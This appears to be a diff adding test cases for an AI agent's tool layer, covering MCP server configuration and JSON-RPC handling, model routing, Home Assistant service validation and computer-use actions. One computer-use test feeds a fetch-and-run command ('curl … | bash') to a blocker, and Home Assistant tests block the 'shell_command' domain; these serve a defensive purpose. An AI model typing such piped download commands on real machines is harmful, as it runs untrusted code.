+   :call ["store-name" "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+   :expect {:value "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"}}
+  {:id :connections/unconfigured :op :connections
+   :call ["status" {} nil]
+   :request {:env {}}
+   :expect {:rows [{"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO" "kind" "dapp" "name" "mihari"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-mihari checkout found; set MIHARI_REPO to its absolute path"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO" "kind" "dapp" "name" "dandori"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :connections/token-matrix :op :connections
+   :call ["status" {"mcp_servers" {"cached" {} "expired" {} "noexpiry" {} "null" {} "garbage" {} "arr" {} "absent" {}}} nil]
+   :request {:env {}}
+   :seed {"mcp-tokens/cached.json" "{\"expires_at\": 9999999999}"
+          "mcp-tokens/expired.json" "{\"expires_at\": 0}"
+          "mcp-tokens/noexpiry.json" "{\"note\": 1}"
+          "mcp-tokens/null.json" "{\"expires_at\": null}"
+          "mcp-tokens/garbage.json" "not json{{"
+          "mcp-tokens/arr.json" "[1, 2]"}
+   :expect {:rows [{"name" "absent" "kind" "mcp" "configured" true "auth" "needs-login"}
+                   {"name" "arr" "kind" "mcp" "configured" true "auth" "token-unreadable"}
+                   {"name" "cached" "kind" "mcp" "configured" true "auth" "token-cached"}
+                   {"name" "expired" "kind" "mcp" "configured" true "auth" "token-expired"}
+                   {"name" "garbage" "kind" "mcp" "configured" true "auth" "token-unreadable"}
+                   {"name" "noexpiry" "kind" "mcp" "configured" true "auth" "token-cached"}
+                   {"name" "null" "kind" "mcp" "configured" true "auth" "token-unreadable"}
+                   {"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO" "kind" "dapp" "name" "mihari"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-mihari checkout found; set MIHARI_REPO to its absolute path"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO" "kind" "dapp" "name" "dandori"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :connections/named-mixed :op :connections
+   :call ["status" {"mcp_servers" {"cached" {}}}
+          [{"name" "cached"} {"name" "nope" "mcp" true} {"name" "nope" "mcp" false}
+           {"name" "hosted-x"} {"name" ""} {"name" false} {"name" "ok" "mcp" nil}]]
+   :request {:env {}}
+   :seed {"mcp-tokens/cached.json" "{\"expires_at\": 9999999999}"}
+   :expect {:rows [{"name" "cached" "kind" "mcp" "configured" true "auth" "token-cached"}
+                   {"name" "nope" "kind" "mcp" "configured" false "auth" "needs-login"}
+                   {"name" "nope" "kind" "hosted" "error" "hosted connector accounts need a tool gateway - not configured here"}
+                   {"name" "hosted-x" "kind" "hosted" "error" "hosted connector accounts need a tool gateway - not configured here"}
+                   {"name" "" "error" "a connection needs a non-blank name string"}
+                   {"name" "false" "error" "a connection needs a non-blank name string"}
+                   {"name" "ok" "error" "mcp must be boolean or absent (omit the key)"}]}}
+  {:id :connections/non-map-item :op :connections
+   :call ["status" {} [{"name" "a"} ["x"]]]
+   :request {:env {}}
+   :expect {:rows {"error" "connections must be a list of objects like {name, mcp}"}}}
+  {:id :connections/bad-requested :op :connections
+   :call ["status" {} "nope"]
+   :request {:env {}}
+   :expect {:rows {"error" "connections must be a list of objects like {name, mcp}"}}}
+  ;; ------------------------------------------------------------ rails (S6b-3)
+  {:id :rails/small-06b :op :rails
+   :call ["small-model?" ["qwen3-0.6b"]]
+   :expect {:value true}}
+  {:id :rails/small-1b :op :rails
+   :call ["small-model?" ["model-1b"]]
+   :expect {:value true}}
+  {:id :rails/small-upper :op :rails
+   :call ["small-model?" ["QWEN-0.6B"]]
+   :expect {:value true}}
+  {:id :rails/small-neg06 :op :rails
+   :call ["small-model?" ["-0.6b"]]
+   :expect {:value true}}
+  {:id :rails/small-mixed :op :rails
+   :call ["small-model?" ["qwen-7b" "tiny-0.6b"]]
+   :expect {:value true}}
+  {:id :rails/big-7b :op :rails
+   :call ["small-model?" ["qwen-7b"]]
+   :expect {:value false}}
+  {:id :rails/big-70b :op :rails
+   :call ["small-model?" ["70b"]]
+   :expect {:value false}}
+  {:id :rails/boundary-digit :op :rails
+   :call ["small-model?" ["1b2"]]
+   :expect {:value false}}
+  {:id :rails/no-b :op :rails
+   :call ["small-model?" ["0.6"]]
+   :expect {:value false}}
+  {:id :rails/normalize-path :op :rails
+   :call ["normalize-ids" ["/data/mishima/model/x.gguf"]]
+   :expect {:value ["mishima" "x"]}}
+  {:id :rails/normalize-mixed :op :rails
+   :call ["normalize-ids" ["plain" "/a/model/z.gguf" "plain"]]
+   :expect {:value ["plain" "a" "z"]}}
+  {:id :rails/normalize-no-model-dir :op :rails
+   :call ["normalize-ids" ["/a/b/c.gguf"]]
+   :expect {:value ["c"]}}
+  {:id :rails/detect-entries :op :rails
+   :call ["detect-entries" [[8095 "http://127.0.0.1:8095/v1" ["mishima"]]
+                            [8094 "http://127.0.0.1:8094/v1" ["qwen3-0.6b"]]]]
+   :expect {:value [{:name "local-8095" :base-url "http://127.0.0.1:8095/v1" :models ["mishima"] :priority 0 :agent? true}
+                    {:name "local-8094" :base-url "http://127.0.0.1:8094/v1" :models ["qwen3-0.6b"] :priority 101 :agent? false}]}}
+  {:id :rails/all-models :op :rails
+   :call ["all-models" {:local [{:models ["a" "b"] :agent? true} {:models ["b" "c"] :agent? false}]}]
+   :expect {:value ["a" "b" "c"]}}
+  {:id :rails/agent-models :op :rails
+   :call ["agent-models" {:local [{:models ["a" "b"] :agent? true} {:models ["b" "c"] :agent? false}]}]
+   :expect {:value ["a" "b"]}}
+  {:id :rails/candidates-exact :op :rails
+   :call ["candidates" {:local [{:name "r1" :priority 1 :models ["a" "b"] :agent? true}
+                                {:name "r2" :priority 0 :models ["b" "c"] :agent? true}]} "b"]
+   :expect {:value [{:name "r2" :priority 0 :models ["b" "c"] :agent? true :use-model "b"}
+                    {:name "r1" :priority 1 :models ["a" "b"] :agent? true :use-model "b"}]}}
+  {:id :rails/candidates-auto :op :rails
+   :call ["candidates" {:local [{:name "r1" :priority 1 :models ["a" "b"] :agent? true}
+                                {:name "r2" :priority 0 :models ["b" "c"] :agent? true}]} "auto"]
+   :expect {:value [{:name "r2" :priority 0 :models ["b" "c"] :agent? true :use-model "b"}
+                    {:name "r1" :priority 1 :models ["a" "b"] :agent? true :use-model "a"}]}}
+  {:id :rails/candidates-unknown :op :rails
+   :call ["candidates" {:local [{:name "r1" :priority 1 :models ["a"] :agent? false}
+                                {:name "r2" :priority 0 :models ["b"] :agent? true}]} "zzz"]
+   :expect {:value [{:name "r2" :priority 0 :models ["b"] :agent? true :use-model "b"}]}}
+  {:id :rails/candidates-empty :op :rails
+   :call ["candidates" {:local []} "m"]
+   :expect {:value []}}
+
+  ;; ------------------------------------------------------------ mcp (S6b-4)
+  {:id :mcp/enabled-missing :op :mcp
+   :call ["enabled?" {}]
+   :expect {:value true}}
+  {:id :mcp/enabled-false :op :mcp
+   :call ["enabled?" {"enabled" false}]
+   :expect {:value false}}
+  {:id :mcp/enabled-string-false :op :mcp
+   :call ["enabled?" {"enabled" "false"}]
+   :expect {:value false}}
+  {:id :mcp/enabled-string-off :op :mcp
+   :call ["enabled?" {"enabled" "OFF"}]
+   :expect {:value false}}
+  {:id :mcp/enabled-string-yes :op :mcp
+   :call ["enabled?" {"enabled" "yes"}]
+   :expect {:value true}}
+  {:id :mcp/enabled-zero :op :mcp
+   :call ["enabled?" {"enabled" 0}]
+   :expect {:value true}}
+  {:id :mcp/names-all :op :mcp
+   :call ["names-for" {"mcp_servers" {"a" {} "b" {"enabled" false} "c" {"enabled" "off"} "d" {}}} nil nil]
+   :expect {:value ["a" "d"]}}
+  {:id :mcp/names-allowlist :op :mcp
+   :call ["names-for" {"mcp_servers" {"a" {} "b" {}}} ["a" "mcp-b" "zzz"] nil]
+   :expect {:value ["a" "b"]}}
+  {:id :mcp/names-no-mcp :op :mcp
+   :call ["names-for" {"mcp_servers" {"a" {}}} ["no_mcp" "a"] nil]
+   :expect {:value []}}
+  {:id :mcp/names-disabled :op :mcp
+   :call ["names-for" {"mcp_servers" {"a" {} "d" {}}} nil ["mcp-d"]]
+   :expect {:value ["a"]}}
+  {:id :mcp/command-string :op :mcp
+   :call ["command-for" {"command" "srv ${H}" "args" ["--x" "${X}" "${MISSING}"]}]
+   :request {:env {"H" "/h" "X" "x"}}
+   :expect {:value ["srv /h" "--x" "x" "${MISSING}"]}}
+  {:id :mcp/command-vector :op :mcp
+   :call ["command-for" {"command" ["kbb" "mcp.mjs"] "args" "notvec"}]
+   :request {:env {}}
+   :expect {:value ["kbb" "mcp.mjs"]}}
+  {:id :mcp/command-missing :op :mcp
+   :call ["command-for" {"args" []}]
+   :request {:env {}}
+   :expect {:value nil}}
+  {:id :mcp/server-env :op :mcp
+   :call ["server-env" {"env" {"FOO" "${X}" "PATH" "/custom"}}]
+   :request {:env {"PATH" "/p" "HOME" "/h" "TMPDIR" "/t" "LANG" "en" "LC_ALL" "en" "XDG_CONFIG_HOME" "/x" "SECRET" "s" "X" "x"}}
+   :expect {:value {"PATH" "/custom" "HOME" "/h" "TMPDIR" "/t" "LANG" "en" "LC_ALL" "en" "XDG_CONFIG_HOME" "/x" "FOO" "x"}}}
+  {:id :mcp/tool-name-short :op :mcp
+   :call ["tool-name" "srv" "do thing"]
+   :expect {:value "mcp__srv__do_thing"}}
+  {:id :mcp/tool-name-long :op :mcp
+   :call ["tool-name" "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"]
+   :expect {:value "mcp__xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx__yyyyyyyyyyyyyyyyyy_5fc28f30"}}
+  {:id :mcp/allowed-include-hit :op :mcp
+   :call ["tool-allowed?" {"tools" {"include" ["a*" "b"]}} "a-1"]
+   :expect {:value true}}
+  {:id :mcp/allowed-include-miss :op :mcp
+   :call ["tool-allowed?" {"tools" {"include" ["a*" "b"]}} "c"]
+   :expect {:value false}}
+  {:id :mcp/allowed-exclude-hit :op :mcp
+   :call ["tool-allowed?" {"tools" {"exclude" ["a*"]}} "a-1"]
+   :expect {:value false}}
+  {:id :mcp/allowed-exclude-miss :op :mcp
+   :call ["tool-allowed?" {"tools" {"exclude" ["a*"]}} "b"]
+   :expect {:value true}}
+  {:id :mcp/allowed-string-raw :op :mcp
+   :call ["tool-allowed?" {"tools" "a*"} "a-1"]
+   :expect {:value true}}
+  {:id :mcp/allowed-none :op :mcp
+   :call ["tool-allowed?" {} "anything"]
+   :expect {:value true}}
+
+  {:id :mcp/expand-env-prefix :op :mcp
+   :call ["command-for" {"command" "srv ${env:H}"}]
+   :request {:env {"H" "/h"}}
+   :expect {:value ["srv /h"]}}
+  {:id :mcp/expand-empty-stays :op :mcp
+   :call ["command-for" {"command" "srv ${}"}]
+   :request {:env {}}
+   :expect {:value ["srv ${}"]}}
+  {:id :mcp/expand-bad-name-stays :op :mcp
+   :call ["command-for" {"command" "srv ${1A}"}]
+   :request {:env {}}
+   :expect {:value ["srv ${1A}"]}}
+  {:id :mcp/expand-unclosed-stays :op :mcp
+   :call ["command-for" {"command" "srv ${H"}]
+   :request {:env {"H" "/h"}}
+   :expect {:value ["srv ${H"]}}
+  {:id :mcp/expand-adjacent :op :mcp
+   :call ["command-for" {"command" "${A}${B}!"}]
+   :request {:env {"A" "a" "B" "b"}}
+   :expect {:value ["ab!"]}}
+  {:id :mcp/expand-no-rescan :op :mcp
+   :call ["command-for" {"command" "srv ${A}"}]
+   :request {:env {"A" "${B}" "B" "x"}}
+   :expect {:value ["srv ${B}"]}}
+  ;; ------------------------------------------------------------ mcp shapes (S6b-5)
+  {:id :mcp/handshake :op :mcp
+   :call ["handshake-lines"]
+   :expect {:value ["{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"initialize\",\"params\":{\"capabilities\":{},\"clientInfo\":{\"name\":\"itonami-agent\",\"version\":\"0.1\"},\"protocolVersion\":\"2024-11-05\"}}" "{\"jsonrpc\":\"2.0\",\"method\":\"notifications/initialized\",\"params\":{}}"]}}
+  {:id :mcp/call-line :op :mcp
+   :call ["call-line" 2 "tools/call" {"name" "n" "arguments" {}}]
+   :expect {:value "{\"id\":2,\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"arguments\":{},\"name\":\"n\"}}"}}
+  {:id :mcp/render-text :op :mcp
+   :call ["render-result" {"content" [{"type" "text" "text" "hi"}]}]
+   :expect {:value "{\"result\":\"hi\"}"}}
+  {:id :mcp/render-is-error :op :mcp
+   :call ["render-result" {"isError" true "content" [{"type" "text" "text" "bad"}]}]
+   :expect {:value "{\"error\":\"bad\"}"}}
+  {:id :mcp/render-is-error-blank :op :mcp
+   :call ["render-result" {"isError" true "content" []}]
+   :expect {:value "{\"error\":\"MCP tool returned an error\"}"}}
+  {:id :mcp/render-dedupe :op :mcp
+   :call ["render-result" {"content" [{"type" "text" "text" "{\"a\":1}"}] "structuredContent" {"a" 1}}]
+   :expect {:value "{\"result\":\"{\\\"a\\\":1}\"}"}}
+  {:id :mcp/render-structured-meta :op :mcp
+   :call ["render-result" {"content" [{"type" "text" "text" "{\"a\":1}"}] "structuredContent" {"b" 2} "_meta" {"m" 1}}]
+   :expect {:value "{\"_meta\":{\"m\":1},\"result\":\"{\\\"a\\\":1}\",\"structuredContent\":{\"b\":2}}"}}
+  {:id :mcp/render-nontext-content :op :mcp
+   :call ["render-result" {"content" [{"type" "image" "data" "x"}]}]
+   :expect {:value "{\"result\":[{\"data\":\"x\",\"type\":\"image\"}]}"}}
+  {:id :mcp/render-empty :op :mcp
+   :call ["render-result" {}]
+   :expect {:value "{\"result\":null}"}}
+  {:id :mcp/render-invalid-json :op :mcp
+   :call ["render-result" {"content" [{"type" "text" "text" "{oops"}]}]
+   :expect {:value "{\"result\":\"{oops\"}"}}
+  {:id :mcp/collect-ok :op :mcp
+   :call ["collect-call-results" {"ids" [2 3] "lines" ["{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"ok\":true}}" "{\"jsonrpc\":\"2.0\",\"id\":3,\"error\":{\"message\":\"nope\"}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"results" [{"ok" true} {"isError" true "error" "nope"}]}}}
+  {:id :mcp/collect-missing :op :mcp
+   :call ["collect-call-results" {"ids" [2 3] "lines" ["{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"ok\":true}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"results" [{"ok" true} {"isError" true "error" "MCP server returned no response"}]}}}
+  {:id :mcp/collect-empty-result :op :mcp
+   :call ["collect-call-results" {"ids" [2] "lines" ["{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"results" [{}]}}}
+  {:id :mcp/collect-timeout :op :mcp
+   :call ["collect-call-results" {"ids" [2] "lines" [] "timed-out?" true "exit" 0}]
+   :expect {:value {"error" "MCP stdio sequence timed out"}}}
+  {:id :mcp/collect-exit :op :mcp
+   :call ["collect-call-results" {"ids" [2] "lines" [] "timed-out?" nil "exit" 1}]
+   :expect {:value {"error" "MCP stdio server exited 1"}}}
+  {:id :mcp/exchange-ok :op :mcp
+   :call ["collect-exchange-result" {"method" "tools/call" "lines" ["{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"v\":1}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"v" 1}}}
+  {:id :mcp/exchange-method-error :op :mcp
+   :call ["collect-exchange-result" {"method" "tools/list" "lines" ["{\"jsonrpc\":\"2.0\",\"id\":2,\"error\":{\"message\":\"boom\"}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"error" "MCP tools/list failed: boom"}}}
+  {:id :mcp/exchange-timeout :op :mcp
+   :call ["collect-exchange-result" {"method" "tools/call" "lines" [] "timed-out?" true "exit" 0}]
+   :expect {:value {"error" "MCP server timed out"}}}
+  {:id :mcp/exchange-exit :op :mcp
+   :call ["collect-exchange-result" {"method" "tools/call" "lines" [] "timed-out?" nil "exit" 2}]
+   :expect {:value {"error" "MCP server exited 2"}}}
+  {:id :mcp/exchange-no-response :op :mcp
+   :call ["collect-exchange-result" {"method" "tools/call" "lines" ["{\"jsonrpc\":\"2.0\",\"id\":9,\"result\":{}}"] "timed-out?" nil "exit" 0}]
+   :expect {:value {"error" "MCP server returned no JSON-RPC response"}}}
+
+  {:id :dapps/with-not-requested :op :dapps
+   :call ["with-servers" {} ["other"] {}]
+   :request {:env {}}
+   :expect {:config {} :added [] :errors []}}
+  {:id :dapps/with-keep-and-error :op :dapps
+   :call ["with-servers" {"mcp_servers" {"mihari" {"command" "keep"}}} ["itonami_dapps"] {}]
+   :request {:env {}}
+   :expect {:config {"mcp_servers" {"mihari" {"command" "keep"}}} :added ["mihari"]
+            :errors [{"server" "dandori" "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :dapps/with-resolve :op :dapps
+   :call ["with-servers" {} ["itonami_dapps"] {}]
+   :request {:env {"MIHARI_REPO" "test/scratch/dapps-with-resolve/mihari"}}
+   :seed {"mihari/bin/mihari-mcp" "#!/bin/sh\n"}
+   :expect {:config {"mcp_servers" {"mihari" {"command" "kbb" "args" ["test/scratch/dapps-with-resolve/mihari/bin/mihari-mcp"] "timeout" 90}}}
+            :added ["mihari"]
+            :errors [{"server" "dandori" "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :dapps/select-add-back :op :dapps
+   :call ["select-servers" {"mcp_servers" {"mihari" {"command" "k"} "x" {}}} ["mcp-x" "itonami_dapps"] [] ["mihari"]]
+   :request {:env {}}
+   :expect {:value ["x" "mihari"]}}
+  {:id :dapps/select-no-mcp :op :dapps
+   :call ["select-servers" {"mcp_servers" {"x" {}}} ["no_mcp"] [] ["x"]]
+   :request {:env {}}
+   :expect {:value []}}
+  {:id :dapps/select-toolset-disabled :op :dapps
+   :call ["select-servers" {"mcp_servers" {"mihari" {"command" "k"} "x" {}}} ["itonami_dapps"] ["itonami_dapps"] ["mihari"]]
+   :request {:env {}}
+   :expect {:value ["x"]}}
+  ;; ------------------------------------------------------------ homeassistant (S6b-6)
+  {:id :ha/entity-ok :op :homeassistant
+   :call ["entity-id-error" "light.kitchen"]
+   :expect {:value nil}}
+  {:id :ha/entity-bad :op :homeassistant
+   :call ["entity-id-error" "Kitchen"]
+   :expect {:value "Invalid entity_id format: Kitchen"}}
+  {:id :ha/entity-nonstring :op :homeassistant
+   :call ["entity-id-error" 5]
+   :expect {:value "Invalid entity_id format: 5"}}
+  {:id :ha/service-ok :op :homeassistant
+   :call ["service-error" "domain" "turn_on"]
+   :expect {:value nil}}
+  {:id :ha/service-bad-domain :op :homeassistant
+   :call ["service-error" "domain" "Bad-Name"]
+   :expect {:value "Invalid domain format: \"Bad-Name\""}}
+  {:id :ha/service-bad-service :op :homeassistant
+   :call ["service-error" "service" ""]
+   :expect {:value "Invalid service format: \"\""}}
+  {:id :ha/blocked-hit :op :homeassistant
+   :call ["blocked-error" "shell_command"]
+   :expect {:value "Service domain 'shell_command' is blocked for security"}}
+  {:id :ha/blocked-miss :op :homeassistant
+   :call ["blocked-error" "light"]
+   :expect {:value nil}}
+  {:id :ha/coerce-nil :op :homeassistant
+   :call ["coerce-data" nil]
+   :expect {:value {}}}
+  {:id :ha/coerce-map :op :homeassistant
+   :call ["coerce-data" {"a" 1}]
+   :expect {:value {"a" 1}}}
+  {:id :ha/coerce-blank :op :homeassistant
+   :call ["coerce-data" ""]
+   :expect {:value {}}}
+  {:id :ha/coerce-json :op :homeassistant
+   :call ["coerce-data" "{\"a\":1}"]
+   :expect {:value {"a" 1}}}
+  {:id :ha/coerce-garbage :op :homeassistant
+   :call ["coerce-data" "nope"]
+   :expect {:value {"error" "Invalid JSON string in 'data' parameter"}}}
+  {:id :ha/coerce-scalar-reject :op :homeassistant
+   :call ["coerce-data" 5]
+   :expect {:value {"error" "data must be a JSON object or JSON string"}}}
+  {:id :ha/payload-ok :op :homeassistant
+   :call ["build-payload" "light" "turn_on" "light.k" {"brightness" 1}]
+   :expect {:value {"brightness" 1 "entity_id" "light.k"}}}
+  {:id :ha/payload-no-entity :op :homeassistant
+   :call ["build-payload" "light" "turn_on" nil {}]
+   :expect {:value {}}}
+  {:id :ha/payload-bad-domain-first :op :homeassistant
+   :call ["build-payload" "BAD" "turn_on" "bad!!" "xx"]
+   :expect {:value "Invalid domain format: \"BAD\""}}
+  {:id :ha/payload-blocked :op :homeassistant
+   :call ["build-payload" "shell_command" "run" nil {}]
+   :expect {:value "Service domain 'shell_command' is blocked for security"}}
+  {:id :ha/payload-bad-entity :op :homeassistant
+   :call ["build-payload" "light" "turn_on" "bad" {}]
+   :expect {:value "Invalid entity_id format: bad"}}
+  {:id :ha/payload-bad-data :op :homeassistant
+   :call ["build-payload" "light" "turn_on" nil "xx"]
+   :expect {:value {"error" "Invalid JSON string in 'data' parameter"}}}
+  {:id :ha/states-domain :op :homeassistant
+   :call ["project-states" [{"entity_id" "light.kitchen" "state" "on" "attributes" {"friendly_name" "Kitchen Lamp" "area" "Kitchen"}} {"entity_id" "sensor.temp" "state" "21" "attributes" {"friendly_name" "Temp" "area" "Desk"}} {"entity_id" "light.desk" "state" "off" "attributes" {}}] "light" ""]
+   :expect {:value {"count" 2 "entities" [{"entity_id" "light.kitchen" "state" "on" "friendly_name" "Kitchen Lamp"} {"entity_id" "light.desk" "state" "off" "friendly_name" ""}]}}}
+  {:id :ha/states-area :op :homeassistant
+   :call ["project-states" [{"entity_id" "light.kitchen" "state" "on" "attributes" {"friendly_name" "Kitchen Lamp" "area" "Kitchen"}} {"entity_id" "light.desk" "state" "off" "attributes" {"friendly_name" "Desk Lamp" "area" "office"}}] "" "kit"]
+   :expect {:value {"count" 1 "entities" [{"entity_id" "light.kitchen" "state" "on" "friendly_name" "Kitchen Lamp"}]}}}
+  {:id :ha/state-one :op :homeassistant
+   :call ["project-state" {"entity_id" "light.k" "state" "on" "attributes" {} "last_changed" "t1" "last_updated" "t2" "extra" 1}]
+   :expect {:value {"entity_id" "light.k" "state" "on" "attributes" {} "last_changed" "t1" "last_updated" "t2"}}}
+  {:id :ha/services-domain :op :homeassistant
+   :call ["project-services" [{"domain" "light" "services" {"turn_on" {"description" "On" "fields" {"brightness" {"description" "Level"}}}}} {"domain" "sensor" "services" {}}] "light"]
+   :expect {:value {"count" 1 "domains" [{"domain" "light" "services" {"turn_on" {"description" "On" "fields" {"brightness" "Level"}}}}]}}}
+  {:id :ha/affected-vec :op :homeassistant
+   :call ["project-affected" [{"entity_id" "light.k" "state" "on" "x" 1}]]
+   :expect {:value [{"entity_id" "light.k" "state" "on"}]}}
+  {:id :ha/affected-nonvec :op :homeassistant
+   :call ["project-affected" {"a" 1}]
+   :expect {:value []}}
+  ;; ------------------------------------------------------------ computer-use (S6b-7)
+  {:id :cua/canon-basic :op :computer-use
+   :call ["canon-keys" "Cmd+Shift+Q"]
+   :expect {:value {:key "q" :modifiers ["cmd" "shift"]}}}
+  {:id :cua/canon-symbols :op :computer-use
+   :call ["canon-keys" "⌘+a"]
+   :expect {:value {:key "a" :modifiers ["cmd"]}}}
+  {:id :cua/canon-single :op :computer-use
+   :call ["canon-keys" "Enter"]
+   :expect {:value {:key "enter" :modifiers []}}}
+  {:id :cua/canon-empty :op :computer-use
+   :call ["canon-keys" ""]
+   :expect {:value {:key nil :modifiers []}}}
+  {:id :cua/canon-dash :op :computer-use
+   :call ["canon-keys" "Control-Alt-Delete"]
+   :expect {:value {:key "delete" :modifiers ["ctrl" "option"]}}}
+  {:id :cua/blocked-pipe :op :computer-use
+   :call ["blocked-input?" "type" {"text" "curl http://x | bash"}]
+   :expect {:value true}}
+  {:id :cua/blocked-clean :op :computer-use
+   :call ["blocked-input?" "type" {"text" "hello"}]
+   :expect {:value false}}
+  {:id :cua/blocked-keys :op :computer-use
+   :call ["blocked-input?" "key" {"keys" "cmd+option+escape"}]
+   :expect {:value true}}
+  {:id :cua/blocked-keys-clean :op :computer-use
+   :call ["blocked-input?" "key" {"keys" "a"}]
+   :expect {:value false}}
+  {:id :cua/blocked-win-l :op :computer-use
+   :call ["blocked-input?" "key" {"keys" "win+l"}]
+   :expect {:value true}}
+  {:id :cua/blocked-cmd-q-noshift :op :computer-use
+   :call ["blocked-input?" "key" {"keys" "cmd+q"}]
+   :expect {:value false}}
+  {:id :cua/select-exact :op :computer-use
+   :call ["select-window" [{"pid" 1 "window_id" 2 "app_name" "A"} {"pid" 1 "window_id" 2 "app_name" "B" "off_screen" true}] nil 1 2]
+   :expect {:value {"pid" 1 "window_id" 2 "app_name" "A"}}}
+  {:id :cua/select-app :op :computer-use
+   :call ["select-window" [{"pid" 1 "window_id" 2 "app_name" "Safari"} {"pid" 3 "window_id" 4 "app_name" "Terminal"}] "term" nil nil]
+   :expect {:value {"pid" 3 "window_id" 4 "app_name" "Terminal"}}}
+  {:id :cua/select-first :op :computer-use
+   :call ["select-window" [{"pid" 1 "window_id" 2 "app_name" "A"}] nil nil nil]
+   :expect {:value {"pid" 1 "window_id" 2 "app_name" "A"}}}
+  {:id :cua/select-none :op :computer-use
+   :call ["select-window" [] "x" nil nil]
+   :expect {:value nil}}
+  {:id :cua/build-request :op :computer-use
+   :call ["build-request" "list_windows" "s1" {"on_screen_only" true}]
+   :expect {:value ["list_windows" {"on_screen_only" true "session" "s1"}]}}
+  {:id :cua/build-request-noargs :op :computer-use
+   :call ["build-request" "start_session" "s" nil]
+   :expect {:value ["start_session" {"session" "s"}]}}
+  {:id :cua/content-text :op :computer-use
+   :call ["content-text" {"content" [{"type" "text" "text" "a"} {"type" "image" "data" "z"} {"type" "text" "text" 42}]}]
+   :expect {:value "a"}}
+  {:id :cua/result-error-field :op :computer-use
+   :call ["result-error" {"error" "boom"}]
+   :expect {:value "boom"}}
+  {:id :cua/result-error-text :op :computer-use
+   :call ["result-error" {"isError" true "content" [{"type" "text" "text" "bad"}]}]
+   :expect {:value "bad"}}
+  {:id :cua/result-error-default :op :computer-use
+   :call ["result-error" {"isError" true "content" []}]
+   :expect {:value ""}}
+  {:id :cua/result-ok :op :computer-use
+   :call ["result-error" {"content" []}]
+   :expect {:value nil}}
+  {:id :cua/action-click :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2 :tokens {3 "t"}} "s" "click" {"button" nil "coordinate" [10 20] "element" 3}]
+   :expect {:value ["click" {"session" "s" "window_id" 2 "element_token" "t" "button" "left" "element_index" 3 "x" 10 "y" 20}]}}
+  {:id :cua/action-type :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "type" {"text" "hi"}]
+   :expect {:value ["type_text" {"session" "s" "window_id" 2 "text" "hi"}]}}
+  {:id :cua/action-hotkey :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "key" {"keys" "cmd+shift+q"}]
+   :expect {:value ["hotkey" {"session" "s" "window_id" 2 "keys" ["cmd" "shift" "q"]}]}}
+  {:id :cua/action-press :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "key" {"keys" "Enter"}]
+   :expect {:value ["press_key" {"session" "s" "window_id" 2 "key" "enter"}]}}
+  {:id :cua/action-scroll-clamp :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "scroll" {"amount" 999}]
+   :expect {:value ["scroll" {"session" "s" "window_id" 2 "direction" "down" "amount" 50}]}}
+  {:id :cua/action-no-target :op :computer-use
+   :call ["action-request" {} "s" "click" {}]
+   :expect {:crash "capture a target window before sending computer input"}}
+  {:id :cua/action-key-noname :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "key" {"keys" ""}]
+   :expect {:crash "key action requires a key name"}}
+  {:id :cua/action-set-value-noelement :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "set_value" {"value" "x"}]
+   :expect {:crash "set_value requires element"}}
+  {:id :cua/action-unsupported :op :computer-use
+   :call ["action-request" {:pid 1 :window-id 2} "s" "frobnicate" {}]
+   :expect {:crash "unsupported computer-use action: frobnicate"}}
